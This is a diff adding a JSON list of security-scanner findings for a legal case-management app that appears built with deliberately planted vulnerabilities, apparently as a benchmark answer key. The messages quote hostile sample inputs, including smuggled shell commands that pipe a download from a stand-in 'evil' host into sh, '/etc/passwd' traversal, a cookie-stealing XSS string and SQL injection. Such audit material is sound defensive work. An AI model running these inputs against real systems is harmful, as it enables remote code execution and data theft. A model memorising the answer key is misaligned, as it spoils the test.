@@ -1,0 +1,992 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.command-injection-pandoc-format",
+      "path": "generated-legal-case-remix/app/lib/transcripts.ts",
+      "start": {
+        "line": 8,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 8,
+        "col": 60,
+        "offset": 0
+      },
+      "extra": {
+        "message": "convertFilingDocument() interpolates the caller-supplied `format` and `sourcePath` directly into a shell command executed via execSync, with no allow-list or quoting. It is called from the download route (app/routes/api.documents.$documentId.download.ts:44) with `format` taken verbatim from the `?format=` query string. Any authenticated user who can download a document can inject shell metacharacters (e.g. `?format=pdf;curl%20evil|sh`) to execute arbitrary OS commands on the server. A safe sibling `convertFilingDocumentSafely` (allow-lists format, quotes paths) exists but is not used by this route.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-exhibit-preview",
+      "path": "generated-legal-case-remix/app/lib/document-export.ts",
+      "start": {
+        "line": 22,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 24,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "buildExhibitPreview() spawns `soffice` via a single shell string built with template interpolation of the attacker-controlled `originalName` (client-supplied upload filename), using `shell: true`. Called from the client-portal upload action at app/routes/_app.portal.upload.tsx:79 with `file.name` as originalName. Any authenticated client can upload a file named e.g. `x; curl evil|sh #.png` to achieve remote code execution. The safe sibling `buildExhibitPreviewSafely` uses an argument array with `shell:false` and a sanitized label, but is not used here.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.file.unrestricted-upload-arbitrary-write",
+      "path": "generated-legal-case-remix/app/routes/_app.portal.upload.tsx",
+      "start": {
+        "line": 16,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 22,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "storeClientExhibit() writes the uploaded file to disk using `${Date.now()}_${originalName}` as the filename, with `originalName` taken directly from the client-supplied `file.name` (see action at line 54: `storeClientExhibit(file.name, buffer)`). There is no filename sanitization, no extension/MIME allow-list, and no path containment check, unlike the hardened upload flow in `_app.matters.$matterId.documents.tsx` (UUID filenames, JPEG/PNG allow-list, size cap). A crafted filename can write arbitrary bytes to attacker-chosen names under the public uploads directory, and (combined with the command injection in buildExhibitPreview) enables RCE.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-434: Unrestricted Upload of File with Dangerous Type"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.code-injection-new-function-rate-rule",
+      "path": "generated-legal-case-remix/app/lib/utils.ts",
+      "start": {
+        "line": 56,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 56,
+        "col": 55,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyPracticeAreaRate() compiles the `rule` string into executable JavaScript via `new Function(\"params\", `return (${rule});`)`. It is called at app/routes/_app.matters.$matterId._index.tsx:70 with `rule = matter.practiceArea?.description`, which is free-text set by any `firm_admin` via _app.admin.practice-areas.tsx with zero validation. Any staff user with matter access who clicks 'Estimate' on a matter whose practice area has an admin-set (or compromised-admin-set) malicious description triggers server-side arbitrary JavaScript execution. The safe sibling `applyPracticeAreaRateSafely` uses a fixed lookup table and is used correctly elsewhere (_app.matters.new.tsx).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authentication.portal-confirmation-code-never-checked",
+      "path": "generated-legal-case-remix/app/lib/auth.ts",
+      "start": {
+        "line": 130,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 134,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "verifyPortalConfirmationCode() never compares `submitted` against the actual issued code (sendPortalConfirmationCode never even stores the code value in the map). It only checks that a pending, unexpired confirmation entry exists for the user, then returns `submitted.length > 0` \u2014 accepting ANY non-empty string. Wired at app/routes/_public.confirm-portal.tsx:22: any attacker who knows a victim's email (e.g. right after triggering their registration) can submit code=1 and be logged into the victim's account via establishSessionFromConfirmation.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-287: Improper Authentication"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authentication.session-fixation-confirmation",
+      "path": "generated-legal-case-remix/app/lib/auth.ts",
+      "start": {
+        "line": 139,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 147,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "establishSessionFromConfirmation() calls getSession(request) and reuses the caller's existing session cookie rather than minting a fresh session, unlike the secure sibling establishSessionFromConfirmationSecurely() which calls sessionStorage.getSession() with no cookie. Used by _public.confirm-portal.tsx:26. An attacker who pre-sets a known session identifier in the victim's browser (session fixation) could ride that same session into an authenticated state once the victim's confirmation succeeds.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-384: Session Fixation"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authentication.weak-password-reset-token-returned-directly",
+      "path": "generated-legal-case-remix/app/routes/_public.forgot-password.tsx",
+      "start": {
+        "line": 20,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 32,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The forgot-password action creates a valid password-reset token and returns it (and the full reset URL) directly in the response to whoever submitted the form \u2014 there is no email round-trip. Anyone who knows or guesses a victim's registered email address can obtain a working password-reset link for that account (full account takeover). The distinct 'No account found with this email' error branch (line 22) also leaks account existence (user enumeration).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-640: Weak Password Recovery Mechanism for Forgotten Password",
+            "CWE-203: Observable Discrepancy"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.mass-assignment-task-quick-edit",
+      "path": "generated-legal-case-remix/app/routes/_app.tasks.$taskId.edit.tsx",
+      "start": {
+        "line": 21,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 26,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyQuickEdit() merges every submitted form field onto the task via Object.assign(task, submitted) with no field allow-list, then persists the entire object. The action (lines 30-36) builds `submitted` from every entry in the posted FormData. A user with legitimate access to one task can add hidden fields like `matterId` or `assigneeId` to reassign the task to a different matter/user, bypassing the ownership model enforced elsewhere in the app.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.unauthenticated-mass-assignment-webhook",
+      "path": "generated-legal-case-remix/app/lib/intake-sync.ts",
+      "start": {
+        "line": 9,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 18,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyIntakeWebhookPayload() does Object.assign(patch, JSON.parse(rawPayload)) and writes the entire patch to prisma.matter.update with no field allow-list. It is invoked from app/routes/api.matters.$matterId.intake-sync.ts, whose action performs NO authentication or signature check at all before calling it. Any unauthenticated caller can POST arbitrary JSON to set any column (clientId, attorneyId, paralegalId, sensitivity, status, etc.) on any matter by ID \u2014 enabling case reassignment/takeover. The safe sibling applyIntakeWebhookPayloadSafely validates against a strict zod schema but is unused here.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes",
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.idor-deadline-mutation",
+      "path": "generated-legal-case-remix/app/routes/_app.deadlines.$deadlineId.tsx",
+      "start": {
+        "line": 51,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 72,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The action only calls requireUser(request) and then updates/reads the deadline by params.deadlineId with no ownership/matter-scoping check (unlike the loader's resolveDeadlineForViewer, which correctly checks isOwnMatter). Any authenticated user \u2014 including an unrelated client \u2014 can POST intent=complete or intent=reopen against any deadline ID belonging to any other firm's matter and mutate it.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.redirect.open-redirect-board-return-header",
+      "path": "generated-legal-case-remix/app/lib/continuation.ts",
+      "start": {
+        "line": 6,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 9,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolveBoardReturn() returns the raw `x-return-to` request header value with no allow-list, and this value is passed straight into redirect() in applyDeadlineCompletionRedirect (app/routes/_app.deadlines.$deadlineId.tsx:47-48). An attacker who can influence this header value on a victim's request (or via a crafted client-side fetch wrapper) can redirect the victim's browser to an arbitrary URL after the mutating POST completes. The safe sibling resolveBoardReturnSafely allow-lists known board views and is used correctly by _app.tasks.$taskId.tsx.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.redirect.open-redirect-login",
+      "path": "generated-legal-case-remix/app/routes/_public.login.tsx",
+      "start": {
+        "line": 16,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 32,
+        "col": 46,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The login action reads `redirectTo` directly from the submitted form data and passes it unvalidated into createUserSession(), which issues a redirect() Response to that value. No check is made that the target is a local path (e.g. starts with '/' and not '//'). An attacker can craft a login link with `redirectTo=https://evil.example.com` to redirect victims to a phishing site immediately after successful authentication.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.fake-encryption-sealed-notes",
+      "path": "generated-legal-case-remix/app/lib/note-sealing.ts",
+      "start": {
+        "line": 42,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 50,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "sealNoteContentSecurely()/unsealNoteContentSecurely() ignore the passcode entirely (`void passcode;`) and merely base64-encode/decode the content \u2014 despite the misleading name and comment implying AEAD encryption. This is the variant actually wired into production at app/routes/_app.matters.$matterId.messages.tsx (lines 15, 76, 84): any matter participant can 'unseal' a supposedly passcode-protected privileged draft by submitting any arbitrary string as the passcode, since it is never checked and the content is trivially reversible.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-311: Missing Encryption of Sensitive Data",
+            "CWE-287: Improper Authentication"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ssti-handlebars-quick-reply",
+      "path": "generated-legal-case-remix/app/lib/message-macros.ts",
+      "start": {
+        "line": 7,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 10,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "composeQuickReply() calls Handlebars.compile(macroBody) where `macroBody` is untrusted, attacker-supplied text (the user-controlled string itself becomes the template, not just data bound into it). Wired at app/routes/_app.matters.$matterId.messages.tsx:100-116: any matter-scoped user (including a client, depending on role checks upstream) can submit an arbitrary `macroBody` textarea value. Unsandboxed Handlebars compilation of user-controlled template source is a known SSTI/RCE vector (e.g. via prototype/constructor gadget chains). The safe sibling composeStandardCheckIn only ever compiles a fixed, vetted template string.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine",
+            "CWE-94: Improper Control of Generation of Code"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.matter-archive-bundle-folder",
+      "path": "generated-legal-case-remix/app/lib/matter-archive.ts",
+      "start": {
+        "line": 11,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 17,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "writeMatterArchiveBundle() joins the caller-supplied `practiceAreaFolder` into the archive path with no containment check. Called from app/routes/_app.admin.exports.tsx:31-33, where `folder = matter.practiceArea?.name` \u2014 free text set by any firm_admin via _app.admin.practice-areas.tsx with no validation. A practice-area name such as `../../../etc` causes archive bundles to be written outside the intended `storage/archives` directory. The safe sibling writeMatterArchiveBundleSafely resolves and validates the path with startsWith() but is unused by this route.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.filing-template-loader",
+      "path": "generated-legal-case-remix/app/lib/filing-templates.ts",
+      "start": {
+        "line": 9,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 12,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "loadFilingTemplate() joins the caller-supplied `templateName` directly into a filesystem path with path.join and no containment check, then reads and returns the file contents. Called via previewIntakeBoilerplate() at app/routes/_app.matters.new.tsx:88-90, reached by the 'preview-template' action (lines 38-46) where `templateName` is read directly from a raw POST form field \u2014 the UI only offers a <select> with two fixed values, but any staff role (firm_admin/attorney/paralegal) can submit an arbitrary value directly, e.g. `../../../../etc/passwd`, and have its contents returned in the response. The safe sibling loadFilingTemplateSafely resolves and validates the path but is unused here.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.data-exposure.plaintext-financial-verification-storage",
+      "path": "generated-legal-case-remix/app/lib/client-verification.ts",
+      "start": {
+        "line": 25,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 33,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "attachVerificationResult() writes the vendor-confirmed `taxId` and `bankAccountNumber` directly to the Client row in plaintext. It is invoked at app/routes/_app.clients.$clientId.edit.tsx:45-47 whenever a `verificationReferenceId` is submitted on the client edit form, storing highly sensitive tax/banking data unencrypted in the database. The secure sibling attachVerificationResultSecurely() envelope-encrypts the account number with AES-256-GCM using a vault-managed key and is correctly used instead by _app.matters.$matterId.edit.tsx:81, showing this is a real regression rather than intentional design.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-312: Cleartext Storage of Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cookie.insecure-coverage-cookie-and-credential-leak",
+      "path": "generated-legal-case-remix/app/lib/delegate-coverage.ts",
+      "start": {
+        "line": 15,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 19,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "grantQueueCoverage() builds a session-bearing cookie with no HttpOnly, Secure, or SameSite attributes (`queue_coverage=${coverageId}:${coveringForUserId}; Path=/; Max-Age=28800`). Invoked at app/routes/_app.admin.users.$userId.tsx:47, whose action (lines 45-51) also returns the raw `coverageId` (the session credential) in the JSON response body in addition to the cookie. This exposes the credential to theft via XSS or network interception. The safe sibling grantQueueCoverageSecurely adds Secure/HttpOnly/SameSite=Strict and never returns the id in the body.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag",
+            "CWE-522: Insufficiently Protected Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection-conflict-check",
+      "path": "generated-legal-case-remix/app/lib/staff-directory.ts",
+      "start": {
+        "line": 42,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 45,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchStaffDirectory() builds the filter string `(cn=*${searchTerm}*)` with no escaping of LDAP special characters, and the underlying ldapSearch() (lines 18-32) explicitly treats a filter that 'breaks out' of its quote with a boolean clause as a compound expression, returning the entire directory. Wired at app/routes/_app.clients.new.tsx:18-21 via the 'conflict-check' intent, where `relatedPartyName` is raw user form input. An attacker can submit a crafted name to dump the full staff/opposing-counsel directory. The sibling verifyGroupAccess() correctly escapes via escapeLdapFilterValue().",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.xpath-injection-docket-lookup",
+      "path": "generated-legal-case-remix/app/lib/court-filing-index.ts",
+      "start": {
+        "line": 43,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 46,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "queryDocketEntriesByNumber() splices the raw `docketNumber` into an XPath-style predicate expression with no escaping, and DocketFeedDocument.find() (lines 25-37) explicitly detects a quote-breakout boolean injection (`' or '`, `'='`) and returns every cached docket entry rather than a scoped match. Wired at app/routes/_app.matters.$matterId.deadlines.tsx:17-19,34-35 via the `docketNumber` GET query parameter. A crafted docket number discloses docket entries belonging to other matters. The sibling queryDocketEntriesByParty() correctly escapes quotes via escapeDocketPredicate().",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf.docket-feed-ssrf-xxe",
+      "path": "generated-legal-case-remix/app/lib/docket-feed-import.ts",
+      "start": {
+        "line": 44,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 48,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "importCourtFeedSubscription() fetches an arbitrary caller-supplied `feedUrl` with no host allow-list (SSRF), and the resulting XML is passed to parseFeedDocument() (lines 16-42), which resolves `<!ENTITY name SYSTEM \"file://...\">` declarations by reading the referenced local file via fs.readFileSync and substituting its contents into the parsed output (XXE). Wired at app/routes/_app.matters.$matterId.deadlines.tsx:40-51: any authenticated user (requireUser only, no role/ownership check) can POST a `feedUrl` pointing at an internal service or a data:/local resource, or a feed document containing a crafted DOCTYPE/ENTITY that reads local files such as `file:///etc/passwd`. The safe sibling importCourtFeedSubscriptionSafely rejects any DOCTYPE/ENTITY declaration.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)",
+            "CWE-611: Improper Restriction of XML External Entity Reference"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.session.non-expiring-co-counsel-jwt",
+      "path": "generated-legal-case-remix/app/lib/co-counsel-access.ts",
+      "start": {
+        "line": 9,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 11,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "issueCoCounselReviewLink() signs a JWT with jwt.sign({matterId, requesterId}, REVIEW_LINK_SECRET) with no `expiresIn`, and verifyCoCounselReviewLink() (lines 13-15) does not enforce any expiry either. This token is redeemed with zero authentication at app/routes/case-review.$token.tsx and issued at app/routes/_app.matters.$matterId.documents.tsx:108-111 (the 'issue-review-link' intent, available to any user with matter access). Once generated, the resulting link grants standing, permanent access to the matter's client-visible notes to anyone who obtains the URL. The secure sibling issueCoCounselReviewLinkSecurely sets `expiresIn: '30m'` and is used correctly elsewhere (_app.matters.$matterId.notes.tsx:81).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-613: Insufficient Session Expiration"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.idor-matter-timeline-export-sharing-tier",
+      "path": "generated-legal-case-remix/app/lib/matter-sharing.ts",
+      "start": {
+        "line": 11,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 29,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "exportMatterTimeline() takes a client-controlled `sharingTier` and, when it equals 'full_file', returns ALL notes and messages for the matter \u2014 including privileged notes and draft messages \u2014 bypassing the canViewNote/canViewMessage visibility model entirely. It is called from app/routes/api.matters.$matterId.timeline-export.ts:8-14, whose action only calls requireUser(request) with NO check that the requester actually owns or is assigned to `params.matterId`. Any authenticated user, including an unrelated client, can POST `sharingTier=full_file` for any matter ID to exfiltrate that matter's privileged notes and internal draft messages. The secure sibling exportMatterTimelineSecurely derives visibility from the requester's authenticated role/relationship rather than trusting the request.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.missing-auth-risk-score-endpoint",
+      "path": "generated-legal-case-remix/app/routes/api.matters.$matterId.risk-score.ts",
+      "start": {
+        "line": 38,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 47,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The loader for `/api/matters/:matterId/risk-score` performs no authentication or authorization check whatsoever before calling loadMatterRiskSnapshot() and returning the result. Any unauthenticated request can retrieve a matter's `sensitivity`, `privilegedDocumentCount`, `privilegedNoteCount`, and `conflictNotes` for any matter ID in the system.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-exposure.verbose-diagnostics-stack-trace",
+      "path": "generated-legal-case-remix/app/routes/api.matters.$matterId.risk-score.ts",
+      "start": {
+        "line": 31,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 36,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "describeRiskSnapshotFailure() returns the raw internal error message and full stack trace whenever the attacker-controlled query parameter `?diagnostics=verbose` is set (see loader at lines 38-46, which reads `diagnosticsLevel` directly from the URL). Combined with the missing-auth finding on this same endpoint, an unauthenticated caller can trigger and read internal stack traces on demand.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.unauthenticated-widget-script-injection",
+      "path": "generated-legal-case-remix/app/routes/portal.widget.$matterId.tsx",
+      "start": {
+        "line": 7,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 15,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderCaseWidgetPage() interpolates `matterTitle` and `status` directly into an inline `<script>` block with no escaping (`var caseState = { title: \"${matterTitle}\", status: \"${status}\" };`). This is a public, unauthenticated, embeddable endpoint (loader at lines 20-26). A matter title such as `x\"}; alert(document.cookie); var y={x:\"` breaks out of the string literal and executes arbitrary JavaScript in the embedding partner page's context. Matter titles are attacker-influenceable, e.g. via the mass-assignment intake webhook (app/lib/intake-sync.ts) which lets an unauthenticated caller set a matter's title to arbitrary text. The sibling portal.filing-status-widget.$matterId.tsx correctly calls an escapeForScriptContext helper before interpolation.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf.citation-preview-header-controlled-url",
+      "path": "generated-legal-case-remix/app/lib/citation-preview.ts",
+      "start": {
+        "line": 7,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 12,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "fetchCitationPreview() fetches `sourceUrl` with no host allow-list. It is called from app/routes/api.matters.$matterId.citation-preview.ts:9-15, which takes `sourceUrl` directly from the `x-citation-source` request header and only requires the caller to be an authenticated user (requireUser). Any logged-in user, including a client, can make the server fetch arbitrary internal or external URLs (e.g. cloud metadata endpoints, internal services) and read back title/snippet content from the response. The safe sibling fetchCitationPreviewSafely restricts requests to a fixed ALLOWED_CITATION_HOSTS set.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cookie.insecure-partner-access-key-cookie",
+      "path": "generated-legal-case-remix/app/lib/portal-prefs.ts",
+      "start": {
+        "line": 18,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 20,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "createPartnerAccessCookie() builds the `pm_partner_key` bearer-style access-key cookie with no HttpOnly, Secure, or SameSite attributes. It is used by app/routes/api.partner-handshake.ts:27 to hand out a session-equivalent credential after the docket partner's handshake. This exposes the key to theft via XSS, transmission over plaintext HTTP, and cross-site leakage. The secure sibling createPartnerAccessCookieSecurely adds Secure/HttpOnly/SameSite=Strict and is used correctly by api.partner-handshake-billing.ts.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag",
+            "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.misconfiguration.permissive-cors-with-credentials",
+      "path": "generated-legal-case-remix/app/routes/api.matters.$matterId.docket-summary.ts",
+      "start": {
+        "line": 40,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 47,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyIntegrationCorsHeaders() reflects any request's `Origin` header back as `Access-Control-Allow-Origin` and additionally sets `Access-Control-Allow-Credentials: true`, applied to this loader's response at line 52. This lets any web origin issue a credentialed cross-site request and read a victim's matter docket data if the browser sends the session cookie along. The sibling api.matters.$matterId.timeline.ts uses an explicit origin allow-list via applyIntegrationCorsHeadersSafely.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.attacker-controlled-bcrypt-work-factor",
+      "path": "generated-legal-case-remix/app/lib/roster-provisioning.ts",
+      "start": {
+        "line": 10,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 22,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "provisionRosterAccount() hashes the temporary password with `hash(tempPassword, workFactor || 4)`, where `workFactor` is taken directly from the request body at app/routes/api.staff.provision.ts:18 (`body.workFactor ? Number(body.workFactor) : undefined`) with no bounds or allow-list. A firm_admin caller (or a compromised admin session) can request `workFactor: 1`, producing a trivially brute-forceable temporary credential hash. The secure sibling provisionRosterAccountSecurely fixes the cost factor at 12 and is used by api.staff.provision-v2.ts.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-916: Use of Password Hash With Insufficient Computational Effort"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection-ledger-report",
+      "path": "generated-legal-case-remix/app/lib/matter-ledger.ts",
+      "start": {
+        "line": 9,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 13,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "runMatterLedgerReport() builds a raw SQL query by directly string-interpolating both `sortField` and `practiceAreaFilter` into a `prisma.$queryRawUnsafe` call, with no allow-list on the sort column and no parameter binding on the filter value. Called from app/routes/api.matters.ledger-report.ts:9-13, where both `sortField` and `practiceAreaId` come straight from query-string parameters, gated only by role (firm_admin/attorney). A crafted `practiceAreaId` such as `' UNION SELECT ... --` allows SQL injection and data exfiltration by any user holding one of those roles. The safe sibling runMatterLedgerReportSafely allow-lists the sort column and binds the filter as `$1`.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
